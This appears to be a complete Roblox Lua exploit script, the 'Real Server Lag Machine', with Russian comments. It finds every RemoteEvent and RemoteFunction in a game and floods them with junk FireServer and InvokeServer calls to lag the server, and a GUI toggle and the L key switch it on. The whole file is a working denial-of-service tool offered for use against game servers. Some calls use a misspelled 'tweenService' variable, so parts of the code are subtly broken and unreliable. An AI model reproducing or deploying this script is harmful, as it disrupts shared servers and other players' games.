-- REAL SERVER LAG MACHINE
local player = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LagEnabled = false
local requestCount = 0
local foundRemotes = {}

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ServerLagGUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainContainer = Instance.new("Frame")
mainContainer.Size = UDim2.new(0, 320, 0, 200)
mainContainer.Position = UDim2.new(0, 400, 0, 20)
mainContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainContainer.BackgroundTransparency = 0.1
mainContainer.BorderSizePixel = 0
mainContainer.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainContainer

local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 40)
header.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
header.BorderSizePixel = 0
header.Parent = mainContainer

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 12)
headerCorner.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.7, 0, 1, 0)
title.Position = UDim2.new(0, 15, 0, 0)
title.Text = "SERVER LAG"
title.TextColor3 = Color3.fromRGB(220, 220, 220)
title.BackgroundTransparency = 1
title.TextSize = 16
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "×"
closeBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
closeBtn.BorderSizePixel = 0
closeBtn.TextSize = 20
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = header

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = closeBtn

local content = Instance.new("Frame")
content.Size = UDim2.new(1, -20, 1, -60)
content.Position = UDim2.new(0, 10, 0, 50)
content.BackgroundTransparency = 1
content.Parent = mainContainer

local lagSection = Instance.new("Frame")
lagSection.Size = UDim2.new(1, 0, 0, 120)
lagSection.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
lagSection.BorderSizePixel = 0
lagSection.Parent = content

local sectionCorner = Instance.new("UICorner")
sectionCorner.CornerRadius = UDim.new(0, 8)
sectionCorner.Parent = lagSection

local lagTitle = Instance.new("TextLabel")
lagTitle.Size = UDim2.new(1, -10, 0, 25)
lagTitle.Position = UDim2.new(0, 10, 0, 5)
lagTitle.Text = "Server Lag System"
lagTitle.TextColor3 = Color3.fromRGB(180, 180, 200)
lagTitle.BackgroundTransparency = 1
lagTitle.TextSize = 12
lagTitle.Font = Enum.Font.Gotham
lagTitle.TextXAlignment = Enum.TextXAlignment.Left
lagTitle.Parent = lagSection

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -10, 0, 60)
statusLabel.Position = UDim2.new(0, 10, 0, 30)
statusLabel.Text = "Status: DISABLED\nRemotes: 0\nRequests: 0"
statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
statusLabel.BackgroundTransparency = 1
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextWrapped = true
statusLabel.Parent = lagSection

local actionsFrame = Instance.new("Frame")
actionsFrame.Size = UDim2.new(1, 0, 0, 40)
actionsFrame.Position = UDim2.new(0, 0, 0, 130)
actionsFrame.BackgroundTransparency = 1
actionsFrame.Parent = content

local function createActionButton(xPosition, text, color)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.48, 0, 0, 35)
    btn.Position = UDim2.new(xPosition, 0, 0, 0)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.BackgroundColor3 = color
    btn.BorderSizePixel = 0
    btn.TextSize = 12
    btn.Font = Enum.Font.GothamMedium
    btn.Parent = actionsFrame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn
    
    return btn
end

local toggleBtn = createActionButton(0, "ENABLE LAG", Color3.fromRGB(200, 60, 60))
local refreshBtn = createActionButton(0.52, "FIND REMOTES", Color3.fromRGB(80, 120, 200))

-- Функции для кнопок
local function setupButtonHover(button)
    local originalColor = button.BackgroundColor3
    button.MouseEnter:Connect(function()
        tweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor * 1.2}):Play()
    end)
    button.MouseLeave:Connect(function()
        tweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
    end)
end

setupButtonHover(closeBtn)
setupButtonHover(toggleBtn)
setupButtonHover(refreshBtn)

local scriptRunning = true

local function closeGUI()
    scriptRunning = false
    screenGui:Destroy()
end

closeBtn.MouseButton1Click:Connect(closeGUI)

-- Перетаскивание окна
local dragging = false
local dragStart, startPos

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainContainer.Position
    end
end)

header.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        mainContainer.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

-- НАХОДИМ REAL REMOTE EVENTS И FUNCTIONS
local function findRemoteObjects()
    foundRemotes = {}
    
    -- Ищем во всех важных местах
    local searchLocations = {
        ReplicatedStorage,
        workspace,
        game:GetService("Lighting"),
        game:GetService("StarterPack"),
        game:GetService("StarterPlayer"),
        game:GetService("StarterGui")
    }
    
    for _, location in pairs(searchLocations) do
        for _, obj in pairs(location:GetDescendants()) do
            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                table.insert(foundRemotes, obj)
            end
        end
    end
    
    statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
    print("📡 Found " .. #foundRemotes .. " remote objects")
end

-- РЕАЛЬНЫЕ ЗАПРОСЫ НА СЕРВЕР
local function sendRealRequests()
    if not LagEnabled or #foundRemotes == 0 then return end
    
    for i = 1, math.min(5, #foundRemotes) do
        local remote = foundRemotes[math.random(1, #foundRemotes)]
        
        pcall(function()
            if remote:IsA("RemoteEvent") then
                -- Отправляем разные типы данных
                local dataTypes = {
                    math.random(1, 1000000),
                    "lag_request_" .. requestCount,
                    Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)),
                    {action = "test", count = requestCount, time = tick()},
                    true,
                    false
                }
                
                local data = dataTypes[math.random(1, #dataTypes)]
                remote:FireServer(data)
                requestCount = requestCount + 1
                
            elseif remote:IsA("RemoteFunction") then
                remote:InvokeServer("invoke_test_" .. requestCount, math.random())
                requestCount = requestCount + 1
            end
        end)
        
        wait(0.01) -- Короткая задержка
    end
end

-- Включение/выключение лагов
toggleBtn.MouseButton1Click:Connect(function()
    LagEnabled = not LagEnabled
    
    if LagEnabled then
        statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        toggleBtn.Text = "DISABLE LAG"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
        print("🚀 SERVER LAG ACTIVATED! Using " .. #foundRemotes .. " remotes")
    else
        statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        toggleBtn.Text = "ENABLE LAG"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        print("🛑 Server lag stopped")
    end
end)

refreshBtn.MouseButton1Click:Connect(function()
    findRemoteObjects()
    local originalText = refreshBtn.Text
    refreshBtn.Text = "REFRESHED!"
    tweenService:Create(refreshBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(100, 180, 100)}):Play()
    wait(1)
    refreshBtn.Text = originalText
    tweenService:Create(refreshBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 120, 200)}):Play()
end)

-- Клавиша L для переключения
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.L then
        LagEnabled = not LagEnabled
        
        if LagEnabled then
            statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
            toggleBtn.Text = "DISABLE LAG"
            toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
        else
            statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
            toggleBtn.Text = "ENABLE LAG"
            toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        end
    end
end)

-- Система создания реальных лагов
spawn(function()
    while scriptRunning do
        if LagEnabled then
            sendRealRequests()
            statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
            wait(0.1) -- 10 запросов в секунду
        else
            wait(0.5)
        end
    end
end)

-- Инициализация
findRemoteObjects()
player.CharacterRemoving:Connect(function()
    if scriptRunning then closeGUI() end
end)

print("🎯 REAL SERVER LAG MACHINE LOADED!")
print("📡 Found " .. #foundRemotes .. " remote objects")
print("🎮 Click ENABLE LAG or press L to start")
print("💥 Sending real requests to server!")
